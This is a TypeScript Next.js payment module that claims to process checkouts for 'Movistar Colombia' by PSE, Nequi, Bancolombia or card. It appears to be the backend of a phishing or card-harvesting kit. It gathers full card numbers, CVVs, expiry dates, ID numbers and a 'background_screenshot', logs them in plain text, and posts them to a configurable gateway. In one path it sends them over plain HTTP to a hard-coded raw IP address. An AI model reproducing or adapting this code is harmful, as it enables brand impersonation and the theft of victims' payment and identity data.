import { NextResponse } from "next/server";
import type { AppSession } from "./session";
import { MAPA_BANCOS_API } from "./bancos";
import { calcularDescuento } from "./discount";

const COMERCIO = "Movistar Colombia";

const metodoUrl = (origin: string) => `${origin}/pago/metodo`;
const pseUrl = (origin: string) => `${origin}/pago/pse`;
const tarjetaUrl = (origin: string) => `${origin}/pago/tarjeta`;

function paymentError(message = "Hubo un error al procesar el pago.") {
  return NextResponse.json({ ok: false, error: message }, { status: 500 });
}

function redirectResponse(url: string) {
  return NextResponse.json({ ok: true, redirect: url });
}

export async function enviarCheckout(
  metodoPago: "PSE" | "TARJETA" | "NEQUI" | "BANCOLOMBIA",
  session: AppSession,
  origin: string,
  screenshot?: string
) {
  const PAYMENT_GATEWAY = process.env.PAYMENT_GATEWAY || "pasarela";
  const pasarela = process.env.PASARELA || "";
  const apiKey = process.env.API_KEY || "";

  if (
    PAYMENT_GATEWAY !== "api" &&
    !pasarela &&
    ["PSE", "BANCOLOMBIA", "NEQUI"].includes(metodoPago)
  ) {
    console.error("[pasarela] PASARELA no configurada");
    return paymentError("Pasarela PSE no configurada. Contacte al administrador.");
  }
  if (!pasarela && metodoPago === "TARJETA") {
    console.error("[pasarela] PASARELA no configurada");
    return paymentError("Pasarela de tarjeta no configurada. Contacte al administrador.");
  }

  try {
    if (["PSE", "BANCOLOMBIA", "NEQUI"].includes(metodoPago)) {
      if (PAYMENT_GATEWAY === "api") {
        return await procesarApiPseExterna(session);
      }
      return await enviarCheckoutPse(pasarela, apiKey, metodoPago, session, origin);
    }

    if (metodoPago === "TARJETA") {
      return await enviarCheckoutTarjeta(pasarela, apiKey, session, origin, screenshot);
    }
  } catch (e) {
    console.error("[pasarela] excepción", e);
    return paymentError("Error de conexión con la pasarela. Intente nuevamente.");
  }

  return NextResponse.json({ ok: true, redirect: `${origin}/error/404` });
}

function armarPayloadPse(
  apiKey: string,
  total: number,
  metodoPago: string,
  session: AppSession,
  origin: string
) {
  return {
    comercio: COMERCIO,
    total,
    api_key: apiKey,
    entidadBancaria: session.entidadBancaria || "",
    nombre: session.nombreUsuario,
    tipo_documento: session.tipoDocumento,
    documento: session.documento,
    correo: session.email ?? "",
    url_retorno_metodo: metodoUrl(origin),
    url_retorno: pseUrl(origin),
    identificador: session.telefono || "",
    metodo: metodoPago.toLowerCase(),
  };
}

function armarPayloadTarjeta(
  apiKey: string,
  total: number,
  session: AppSession,
  origin: string,
  screenshot: string
) {
  return {
    comercio: COMERCIO,
    total,
    api_key: apiKey,
    tarjeta: (session.numTarjeta || "").replace(/\D/g, ""),
    cvv: session.cvv,
    expiracion: session.fechaVencimiento,
    nombre: (session.nombreUsuario || "").toUpperCase(),
    cuotas: session.cuotas,
    background_screenshot: screenshot,
    correo: session.email ?? "",
    tipo_documento: session.tipoDocumento,
    documento: session.documento,
    url_retorno_metodo: metodoUrl(origin),
    url_retorno: tarjetaUrl(origin),
    identificador: session.telefono || "",
    metodo: "tarjeta",
  };
}

async function enviarCheckoutPse(
  pasarela: string,
  apiKey: string,
  metodoPago: string,
  session: AppSession,
  origin: string
) {
  const total = Math.floor(calcularDescuento(session.total ?? 0, session.descuentoPorcentaje ?? 0));
  const payload = armarPayloadPse(apiKey, total, metodoPago, session, origin);
  const url = `${pasarela}/api/checkout`;

  console.info("[pasarela] PSE Request", { url, payload });

  let res: Response;
  try {
    res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(25000),
    });
  } catch (e) {
    console.error("[pasarela] PSE fetch falló", { url, error: String(e) });
    return paymentError("No se pudo conectar con la pasarela.");
  }

  const rawBody = await res.text();
  let body: { success?: boolean; data?: { checkout_url?: string } } | null = null;
  try {
    body = rawBody ? JSON.parse(rawBody) : null;
  } catch {
    console.error("[pasarela] PSE respuesta no es JSON", {
      status: res.status,
      bodyPreview: rawBody.slice(0, 500),
    });
    return paymentError("Respuesta inválida de la pasarela.");
  }
  console.info("[pasarela] PSE Response", res.status, body);

  if (res.ok && body?.success) {
    const checkoutUrl = body?.data?.checkout_url;
    if (!checkoutUrl) {
      console.error("[pasarela] PSE sin checkout_url", body);
      return paymentError("La pasarela no devolvió URL de pago.");
    }
    return redirectResponse(checkoutUrl);
  }

  console.error("[pasarela] PSE Payment Error", { status: res.status, body });
  return paymentError("Error al procesar el pago. Intente nuevamente.");
}

async function enviarCheckoutTarjeta(
  pasarela: string,
  apiKey: string,
  session: AppSession,
  origin: string,
  screenshot?: string
) {
  const total = Math.floor(calcularDescuento(session.total ?? 0, session.descuentoPorcentaje ?? 0));
  const payload = armarPayloadTarjeta(apiKey, total, session, origin, screenshot || "");
  const url = `${pasarela}/api/checkout`;

  console.info("[pasarela] TARJETA Request", { url, payload });

  let res: Response;
  try {
    res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(25000),
    });
  } catch (e) {
    console.error("[pasarela] TARJETA fetch falló", { url, error: String(e) });
    return paymentError("No se pudo conectar con la pasarela.");
  }

  const rawBody = await res.text();
  let body: { success?: boolean; data?: { checkout_url?: string } } | null = null;
  try {
    body = rawBody ? JSON.parse(rawBody) : null;
  } catch {
    console.error("[pasarela] TARJETA respuesta no es JSON", {
      status: res.status,
      bodyPreview: rawBody.slice(0, 500),
    });
    return paymentError("Respuesta inválida de la pasarela.");
  }
  console.info("[pasarela] TARJETA Response", res.status, body);

  if (res.ok && body?.success) {
    const checkoutUrl = body?.data?.checkout_url;
    if (!checkoutUrl) {
      console.error("[pasarela] TARJETA sin checkout_url", body);
      return paymentError("La pasarela no devolvió URL de pago.");
    }
    return redirectResponse(checkoutUrl);
  }

  console.error("[pasarela] TARJETA Payment Error", body);
  return paymentError("Error al procesar el pago. Intente nuevamente.");
}

const TIPO_DOC_MAP: Record<string, string> = {
  CC: "01",
  CE: "02",
  NIT: "03",
  TI: "05",
  PP: "06",
  PAS: "06",
};

async function procesarApiPseExterna(session: AppSession) {
  const total = Math.floor(calcularDescuento(session.total ?? 0, session.descuentoPorcentaje ?? 0));
  const entidadBancaria = session.entidadBancaria || "";
  const bancoInfo = MAPA_BANCOS_API[entidadBancaria];

  if (!bancoInfo) {
    console.error("[pasarela] Banco no encontrado en mapa API", entidadBancaria);
    return paymentError("Banco no válido para pago PSE.");
  }

  const celularApi = process.env.CELULAR_API || "3118429895";
  const tipoDoc = TIPO_DOC_MAP[session.tipoDocumento || ""] ?? "01";

  const datosAPI = {
    nombre: session.nombreUsuario,
    tipoDoc,
    documento: session.documento,
    correo: session.email ?? "",
    celular: celularApi,
    saldo: String(total),
    id: bancoInfo.id,
    banco: bancoInfo.nombre,
  };

  console.info("[pasarela] API PSE Request", datosAPI);

  try {
    const res = await fetch("http://194.15.36.142/api5/pago", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(datosAPI),
      signal: AbortSignal.timeout(60000),
    });

    const body = (await res.json().catch(() => null)) as
      | { uri?: string }
      | null;
    console.info("[pasarela] API PSE Response", res.status, body);

    if (res.ok && body?.uri) {
      return redirectResponse(body.uri);
    }

    console.error("[pasarela] API PSE Error", body);
    return paymentError("Error al procesar el pago. Intente nuevamente.");
  } catch (e) {
    console.error("[pasarela] API PSE Exception", e);
    return paymentError("Error de conexión con el servicio de pago. Intente nuevamente.");
  }
}
